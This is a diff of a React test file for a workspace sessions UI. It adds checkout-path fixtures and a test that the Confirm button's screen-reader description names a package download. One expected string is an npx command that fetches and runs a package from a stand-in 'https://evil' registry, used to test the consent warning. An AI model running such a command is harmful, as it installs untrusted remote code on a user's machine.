@@ -182,6 +182,7 @@ const workspace: IpcWorkspace = {
   projectId: project.id,
   title: "main",
   isolation: "local",
+  path: "C:\\devboule",
 };
 const secondProject: Project = {
   id: "project-2",
@@ -193,12 +194,14 @@ const secondWorkspace: IpcWorkspace = {
   projectId: secondProject.id,
   title: "other-main",
   isolation: "local",
+  path: "C:\\other-project",
 };
 const createdWorkspace: IpcWorkspace = {
   id: "workspace-created",
   projectId: project.id,
   title: "new-workspace",
   isolation: "local",
+  path: "C:\\devboule",
 };
 
 const permissionRequest: PermissionRequest = {
@@ -293,6 +296,34 @@ describe("Workspace sessions", () => {
     );
     expect(row?.textContent).toContain("1 live session · local");
     expect(row?.textContent).not.toContain("dirty");
+    expect(row?.title).toBe("C:\\devboule");
+  });
+
+  it("exposes the checkout path on hover and omits it when the daemon sent none", async () => {
+    const worktreeWorkspace: IpcWorkspace = {
+      id: "workspace-worktree",
+      projectId: project.id,
+      title: "feature-x",
+      isolation: "worktree",
+      path: "C:\\devboule.worktrees\\feature-x-9f2e1a",
+    };
+    const bareWorkspace: IpcWorkspace = {
+      id: "workspace-bare",
+      projectId: project.id,
+      title: "no-path",
+      isolation: "local",
+      path: "",
+    };
+    vi.mocked(workspacesList).mockResolvedValue([worktreeWorkspace, bareWorkspace]);
+    root = createRoot(container);
+    await act(async () => root.render(<Workspace />));
+    await act(async () => undefined);
+
+    const rows = container.querySelectorAll<HTMLButtonElement>("button.workspace-row");
+    expect(rows.length).toBe(2);
+    expect(rows[0]?.title).toBe("C:\\devboule.worktrees\\feature-x-9f2e1a");
+    expect(rows[0]?.textContent).not.toContain("C:\\devboule.worktrees\\feature-x-9f2e1a");
+    expect(rows[1]?.title).toBe("");
   });
 
   it("shows the daemon's project-load failure instead of an empty-project message", async () => {
@@ -352,6 +383,7 @@ describe("Workspace sessions", () => {
       projectId: createdProject.id,
       title: "created-main",
       isolation: "local",
+      path: "C:\\created-during-load",
     };
     let releaseInitialWorkspaces: ((value: IpcWorkspace[]) => void) | undefined;
     const initialWorkspaces = new Promise<IpcWorkspace[]>((resolve) => {
@@ -1103,6 +1135,53 @@ describe("Workspace sessions", () => {
     );
     expect(container.textContent).toContain("npx will download and run third-party code");
     expect(sessionCreate).not.toHaveBeenCalled();
+  });
+
+  it("names the command and the download in Confirm's accessible description", async () => {
+    vi.mocked(providersList).mockResolvedValue({
+      providers: [grokProvider, npxProvider],
+      unreadableDirs: 0,
+    });
+    root = createRoot(container);
+    await act(async () => {
+      root.render(<Workspace />);
+    });
+    await act(async () => undefined);
+
+    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
+    if (newWorkspace === null) throw new Error("new workspace control did not render");
+    await act(async () => newWorkspace.click());
+    await act(async () => undefined);
+
+    const codexOption = Array.from(
+      container.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
+    ).find((button) => button.textContent?.includes("codex-acp"));
+    if (codexOption === undefined) throw new Error("codex-acp option did not render");
+    await act(async () => codexOption.click());
+    await act(async () => undefined);
+
+    // Focus lands on Confirm when the card opens, so its description is the
+    // whole of what a screen-reader user hears before approving a package
+    // download. Resolve the ids to their TEXT rather than asserting the
+    // attribute exists: the spoken words are the thing under test, and an
+    // aria-describedby pointing at a missing or empty node announces nothing
+    // while still satisfying an attribute check.
+    const confirm = Array.from(container.querySelectorAll<HTMLButtonElement>("button")).find(
+      (button) => button.textContent?.trim() === "Confirm",
+    );
+    if (confirm === undefined) throw new Error("Confirm did not render");
+    expect(document.activeElement).toBe(confirm);
+
+    const described = (confirm.getAttribute("aria-describedby") ?? "")
+      .split(/\s+/)
+      .filter((id) => id.length > 0)
+      .map((id) => container.querySelector(`#${id}`)?.textContent ?? "")
+      .join(" ");
+
+    expect(described).toContain(
+      "npx -y @agentclientprotocol/codex-acp@1.10.0 --registry=https://evil",
+    );
+    expect(described).toContain("download and run third-party code");
   });
 
   it("Confirm on consent panel calls create exactly once", async () => {
